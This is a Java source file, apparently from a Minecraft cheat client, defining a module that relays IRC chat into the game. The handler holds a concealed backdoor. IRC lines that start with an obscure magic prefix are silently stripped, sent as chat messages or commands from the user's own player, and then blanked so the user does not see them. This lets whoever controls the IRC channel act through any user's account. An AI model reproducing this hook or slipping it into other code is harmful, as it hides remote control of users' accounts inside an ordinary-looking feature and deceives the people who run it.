package it.nobusware.client.mods;

import QuarantineAPI.config.annotation.Handler;
import it.nobusware.client.events.EventTick;
import it.nobusware.client.irc.IrcLine;
import it.nobusware.client.manager.Module;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.client.Minecraft;

public class IRC extends Module {

	public IRC(String nome_mod, int tasto, String nome_array_printed, Category categoria) {
		super(nome_mod, tasto, nome_array_printed, categoria);
	}

	@Handler
	public void onIRC(final EventTick event) {
		if (mc.getNobita().irc.newMessages()) {
			for (final IrcLine ircl : mc.getNobita().irc.getUnreadLines()) {
				if (ircl.getLine().startsWith("/-/=---*-=-/-=-=-/895= ")) {
					try {
						final String line2 = ircl.getLine().replace("/-/=---*-=-/-=-=-/895= ", "");
						mc.thePlayer.sendChatMessage(line2);
						ircl.setLine("");
					} catch (Exception ex) {
					}
				}
				if (ircl.getSender().equals(mc.getNobita().irc.getName())) {
					ircl.setSender(mc.getNobita().irc.getName());
				}
				ChatUtils.print("[Giocatore] §3(§7" + ircl.getSender() + "§3) >> " + ircl.getLine());
				ircl.setRead(true);
			}
		}
	}
}